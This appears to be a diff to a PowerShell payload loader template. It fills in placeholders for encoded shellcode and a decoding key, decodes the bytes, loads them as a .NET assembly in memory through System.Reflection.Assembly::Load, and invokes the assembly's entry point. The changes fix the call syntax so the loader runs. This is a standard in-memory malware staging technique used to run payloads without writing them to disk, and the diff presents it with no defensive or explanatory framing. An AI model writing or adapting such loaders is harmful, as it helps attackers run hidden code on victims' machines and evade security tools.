@@ -14,16 +14,14 @@
     return $__RawPayload__
 }
 
-$__PayloadTemplate__ = [int[]]@()
+$__PayloadTemplate__ = [int[]]@(__SHELLCODE_PLACEHOLDER__)
 
-$__PayloadKey__ = 174;
+$__PayloadKey__ = __KEY_PLACEHOLDER__
 
-$__RawLoader__ = __DecodePayload__($__PayloadTemplate__, $__PayloadKey__)
+$__RawLoader__ = __DecodePayload__ $__PayloadTemplate__ $__PayloadKey__
 
 $__Assembly__ = [System.Reflection.Assembly]::Load($__RawLoader__)
 
-$__TypeLoader__ = $__Assembly__.GetType("")
+$__Entry__ = $__Assembly__.EntryPoint
 
-$__MethodLoader__ = $__TypeLoader__.GetMethod();
-
-$__MethodLoader__.Invoke($null)
+$__Entry__.Invoke($null, @())
